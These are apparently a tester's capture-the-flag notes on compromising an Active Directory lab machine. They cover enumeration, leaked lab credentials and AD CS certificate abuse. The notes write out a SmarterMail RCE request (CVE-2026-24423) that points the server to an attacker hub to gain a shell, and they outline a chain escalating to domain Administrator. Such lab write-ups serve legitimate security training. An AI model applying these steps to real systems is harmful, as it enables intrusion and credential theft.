# danglingtree.htb — notatki

## Target
- **IP:** 10.129.6.118
- **VPN:** `~/Downloads/ass.ovpn` → tun0
- **Domain:** `danglingtree.htb` / NetBIOS `DANGLINGTREE`
- **Host:** `DC` / `dc.danglingtree.htb`
- **OS:** Windows 11 / Server 2025 Build 26100 x64
- **Typ:** DC (AD) — turniej

## nmap (initial)
| Port | Service |
|------|---------|
| 53 | DNS Simple DNS Plus |
| 80 | IIS 10.0 (default iisstart) |
| 88 | Kerberos |
| 135 | MSRPC |
| 139/445 | SMB (signing required) |
| 389/636 | LDAP / LDAPS |
| 443 | HTTPS IIS (cert CA: danglingtree-DC-CA) |
| 464 | kpasswd |
| 593 | RPC over HTTP |
| 3268/3269 | GC LDAP |
| 3389 | RDP |

## Clock skew
- Box ~**+7h** względem Kali (Kerberos będzie padać bez synchronizacji czasu).
- Przy auth Kerberos: `sudo timedatectl set-ntp false` + ustawienie czasu na czas boxa, albo `faketime` / ntpdate do DC.

## Recon findings (start)
- Null SMB auth: **True** — share list: ACCESS_DENIED
- **Guest** (blank): share **IT** READ + IPC$
  - `IT\Security\DanglingTree_RoE_Assessment.pdf` → **credy red team**
- LDAP anonymous: tylko rootDSE; subtree wymaga bind
- Web 80/443: domyślna strona IIS — na razie bez appki
- Clock skew ~**+7h** (box UTC vs lokal) — Kerberos!

## Initial creds (RoE PDF)
| User | Pass | Notes |
|------|------|-------|
| `anderson.w` | `R3dT3am@Acc3ss#01` | low-priv domain user (auth check w loot/) |

## TODO
- [x] shares guest → IT + PDF
- [x] validate anderson.w — SMB+LDAP OK, WinRM nie w top ports
- [ ] BloodHound / ldap enum as anderson.w
- [ ] Kerberoast / AS-REP / ACLs / RBCD
- [ ] clock fix przed kerberos
- [ ] user flag / root flag

## Enum jako anderson.w (2026-08-09)

### Co daje konto
- **SMB** auth OK (signing required) — NETLOGON/SYSVOL READ; share IT list/bez write
- **LDAP/LDAPS** OK — **LDAP signing Enforced** (plain `-x` bez TLS pada)
- **ACL-blindness:** prawie nie widać obiektów w `CN=Users` (0 dzieci); nxc --users pokazuje tylko siebie
- **RID brute** i **net rpc group** omijają blind LDAP
- **Brak shella:** WinRM 5985 **filtered/closed** mimo Remote Management Users; RDP jest, ale anderson **nie** w RDP Users
- **Kerberos:** clock skew ~+7h względem hosta — trzeba `date -u -s` do czasu boxa
- **AD CS:** CA `danglingtree-DC-CA` na DC; Authenticated Users = Enroll na CA
- Web 80/443: default IIS

### Ukryci userzy (RID)
| RID | Account | Typ |
|-----|---------|-----|
| 500 | Administrator | user |
| 1103 | **jake.h** | user — kluczowy |
| 1110 | svc_mail | user |
| 1602 | noah.b | user |
| 1604 | **alex.o** | user |
| 2601 | anderson.w | user (my) |

### Grupy cert/PKI
| Group | RID | Members | Znaczenie |
|-------|-----|---------|-----------|
| Helpdesk_Cert_Support | 1106 | **jake.h** | **ManageCertificates** na CA → ESC7 |
| DevOps_PKI | 1108 | **jake.h** | RDP + WinRM |
| Template_Editors | 1107 | **jake.h** | możliwy ESC4 (WriteDacl templates) |
| Cert_Managers | 1105 | (pusto z RPC) | ? |
| support-it | 1603 | **alex.o** | ? |
| Remote Management Users | - | anderson.w, jake groups | WinRM rights theoretical |
| Remote Desktop Users | - | Helpdesk_Cert_Support, DevOps_PKI | RDP → jake groups |

### AD CS templates
- **User** (enabled): Domain Users mogą enroll → anderson tak (certipy timeout przy próbie)
- **SubCA** enabled + SAN, ale Enroll tylko DA/EA
- Web enrollment: OFF
- User Specified SAN na CA: Disabled
- Brak oczywistego ESC1 dla anderson (nie da się enroll SAN templates z Client Auth)

### Path idea
1. Dostać **jake.h** (password / hash / relay / spn)
2. → Template_Editors / Helpdesk_Cert_Support → ESC4/ESC7 → DA
3. albo alex.o via support-it

## Shells (2026-08-09)

### 1) anderson.w — Windows Admin Center HTTPS:6600
- Login: `/api/user/key` + RSA-OAEP-256 packet → `/api/user/login`
- PS: `POST /api/nodes/localhost/features/powershellApi/invokeCommand`
  body: `{"properties":{"script":"...","command":null,"module":null,"state":"ready"}}`
- Helper: `scripts/wac_ps.py`
- WinRM 5985 listens on host but **filtered** from Kali VPN

### 2) svc_mail — CVE-2026-24423 SmarterMail RCE
- SmarterMail **100.0.9504** (< 9511) on **127.0.0.1 / 0.0.0.0:17017** (FW blocks external)
- Trigger from anderson WAC → localhost:
  `POST http://127.0.0.1:17017/api/v1/settings/sysadmin/connect-to-hub`
  `{"hubAddress":"http://10.10.15.62:8082","oneTimePassword":"x","nodeName":"n"}`
- Fake hub returns SystemMount.CommandMount → cmd.exe RCE as **danglingtree\svc_mail**
- Hub: `scripts/cve_2026_24423_hub.py` + `scripts/rev.ps1` + `scripts/pwn.bat`

### SMB IT report
- Guest: `IT\Security\DanglingTree_RoE_Assessment.pdf` (anderson creds)
- Anderson: IT ACCESS_DENIED listing

### Loot
- `loot/smartermail/exfil/` — accounts + user settings + mail_loot.zip
- Encrypted mail pwds: `loot/smartermail/encrypted_passwords.txt`
- bak users: emma.s, oliver.t, sophia.k, liam.m, noah.b, amelia.r, svc_mail

### TODO next
- [ ] decrypt SmarterMail password_encrypted (or dump domain pass from AD as svc_mail)
- [ ] user.txt location
- [ ] jake.h path via cert groups (ESC)


## Status 2026-08-09 (Ania auto-push)

### Done
- CVE deep loot svc_mail: no user.txt at standard paths (Test-Path false / empty desktops from svc view)
- No SPN kerberoast, no AS-REP
- LAPS unreadable for lowpriv; SeMachineAccount: MAQ exceeded
- AD CS: Helpdesk_Cert_Support=jake (ESC7), no vulnerable template for noah
- user flag path still: noah session Files WAC or real logon as noah

### Blockers
- noah: no RDP group, no WAC PS, no WinRM from anderson with creds
- jake: no password, never logged on
- mail bak passwords known but not AD; live SM only svc_mail


## ROOT DONE (2026-08-09)
- Path: anderson WAC → noah user → alex DPAPI → jake FCP → ESC1 EmployeeAuthTemplate → Administrator
- user: <REDACTED_FLAG>
- root: <REDACTED_FLAG>
- Scripts: wac_ps, noah_exec, fcp_jake, sync_time_to_dc, esc1_get_admin, get_flags
- Write-up: WRITEUP.md
